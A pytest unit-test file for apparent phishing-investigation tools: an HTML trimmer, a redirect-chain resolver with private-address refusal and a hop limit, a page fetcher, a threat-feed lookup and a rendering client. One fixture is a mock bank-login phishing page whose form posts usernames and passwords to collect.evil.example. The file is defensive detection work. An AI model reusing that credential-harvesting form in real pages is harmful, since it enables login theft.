"""Unit tests for the investigation evidence tools."""

from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import pytest

from infrastructure.browser_run import BrowserRunClient, RenderResult
from services.safety.tools import (
    InvestigationToolDeps,
    build_investigation_tools,
    resolve_chain_impl,
    trim_html,
)


class TestTrimHtml:
    def test_extracts_the_judgment_surface(self):
        html = """
        <html><head><title>Secure Bank Login</title>
        <meta name="description" content="Log in to your account">
        <script src="https://cdn.evil.example/kit.js"></script>
        <style>body{color:red}</style></head>
        <body><h1>Welcome</h1>
        <form action="https://collect.evil.example/post">
          <input type="text" name="username">
          <input type="password" name="password">
        </form>
        <script>var hidden = "never visible";</script>
        <p>Please verify your identity.</p></body></html>
        """
        out = trim_html(html)
        assert "title: Secure Bank Login" in out
        assert "meta description: Log in to your account" in out
        assert "action=https://collect.evil.example/post" in out
        assert "password:password" in out
        assert "cdn.evil.example" in out
        assert "Please verify your identity." in out
        # script/style contents never reach the visible text
        assert "never visible" not in out
        assert "color:red" not in out

    def test_visible_text_is_capped(self):
        html = "<body>" + ("word " * 5000) + "</body>"
        out = trim_html(html)
        assert len(out) < 4000

    def test_hostile_markup_keeps_what_parsed(self):
        assert "title:" in trim_html("<title>ok</title><form><<<%%%")


class TestResolveChain:
    @pytest.mark.asyncio
    async def test_private_address_hop_is_refused(self):
        with patch(
            "services.safety.tools._host_is_private_async",
            AsyncMock(return_value=True),
        ):
            out = await resolve_chain_impl("https://internal.example/x")
        assert "refused" in out
        assert "hop 1" in out

    @pytest.mark.asyncio
    async def test_walks_hops_and_flags_cross_domain(self):
        responses = [
            SimpleNamespace(
                status_code=301,
                is_redirect=True,
                headers={"location": "https://final-dest.net/page"},
            ),
            SimpleNamespace(
                status_code=200,
                is_redirect=False,
                headers={"content-type": "text/html"},
            ),
        ]
        client = AsyncMock()
        client.head = AsyncMock(side_effect=responses)
        client.__aenter__ = AsyncMock(return_value=client)
        client.__aexit__ = AsyncMock(return_value=False)
        with (
            patch(
                "services.safety.tools._host_is_private_async",
                AsyncMock(return_value=False),
            ),
            patch("services.safety.tools.httpx.AsyncClient", return_value=client),
        ):
            out = await resolve_chain_impl("https://start-src.com/r")
        assert "hop 1" in out and "[cross-domain]" in out
        assert "final: https://final-dest.net/page → HTTP 200" in out
        # The model is always told what this tool cannot see.
        assert "JS and meta redirects are invisible" in out

    @pytest.mark.asyncio
    async def test_hop_ceiling_stops_infinite_loops(self):
        loop_response = SimpleNamespace(
            status_code=302,
            is_redirect=True,
            headers={"location": "https://loop.example/again"},
        )
        client = AsyncMock()
        client.head = AsyncMock(return_value=loop_response)
        client.__aenter__ = AsyncMock(return_value=client)
        client.__aexit__ = AsyncMock(return_value=False)
        with (
            patch(
                "services.safety.tools._host_is_private_async",
                AsyncMock(return_value=False),
            ),
            patch("services.safety.tools.httpx.AsyncClient", return_value=client),
        ):
            out = await resolve_chain_impl("https://loop.example/start")
        assert "exceeded 10 hops" in out


def _deps(**overrides) -> InvestigationToolDeps:
    browser = AsyncMock(spec=BrowserRunClient)
    feed_repo = AsyncMock()
    feed_repo.contains = AsyncMock(return_value=False)
    defaults = dict(
        browser=browser, http=AsyncMock(), feed_repo=feed_repo, web_risk=None
    )
    defaults.update(overrides)
    return InvestigationToolDeps(**defaults)


class TestFetchPageTool:
    @pytest.mark.asyncio
    async def test_result_names_its_egress(self):
        deps = _deps()
        deps.browser.snapshot = AsyncMock(
            return_value=RenderResult(
                url="https://x.example", html="<title>Hi</title>", screenshot=b""
            )
        )
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        out = await fetch_page("https://x.example")
        assert "rendered via cloudflare datacenter" in out.lower()
        assert "title: Hi" in out

    @pytest.mark.asyncio
    async def test_dead_render_reads_as_missing_evidence_not_clean(self):
        deps = _deps()
        deps.browser.snapshot = AsyncMock(return_value=None)
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        out = await fetch_page("https://x.example")
        assert "missing evidence" in out
        assert "clean" in out  # explicitly told NOT to read absence as clean


class TestFeedLookupTool:
    @pytest.mark.asyncio
    async def test_hit_reports_hard_signal(self):
        deps = _deps()
        deps.feed_repo.contains = AsyncMock(
            side_effect=lambda feed, dom: feed == "fishfish"
        )
        feed_lookup = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "feed_lookup"
        )
        out = await feed_lookup("evil.example")
        assert "HARD HITS" in out and "feed:fishfish" in out

    @pytest.mark.asyncio
    async def test_clean_host_reports_no_hits(self):
        feed_lookup = next(
            t for t in build_investigation_tools(_deps()) if t.__name__ == "feed_lookup"
        )
        assert "no feed or Web Risk hits" in await feed_lookup("fine.example")


class TestBrowserRunClient:
    @pytest.mark.asyncio
    async def test_unconfigured_returns_none(self):
        client = BrowserRunClient(AsyncMock(), account_id="", api_token="")
        assert await client.snapshot("https://x.example") is None

    @pytest.mark.asyncio
    async def test_snapshot_decodes_result(self):
        import base64

        http = AsyncMock()
        http.post = AsyncMock(
            return_value=SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: {
                    "result": {
                        "content": "<title>ok</title>",
                        "screenshot": base64.b64encode(b"webpbytes").decode(),
                    }
                },
            )
        )
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        result = await client.snapshot("https://x.example")
        assert result is not None
        assert result.html == "<title>ok</title>"
        assert result.screenshot == b"webpbytes"
        # The auth header rides the request; the URL names the account.
        args, kwargs = http.post.await_args
        assert "acc/browser-rendering/snapshot" in args[0]
        assert kwargs["headers"]["Authorization"] == "Bearer tok"

    @pytest.mark.asyncio
    async def test_api_failure_returns_none(self):
        http = AsyncMock()
        http.post = AsyncMock(side_effect=RuntimeError("cf down"))
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        assert await client.snapshot("https://x.example") is None
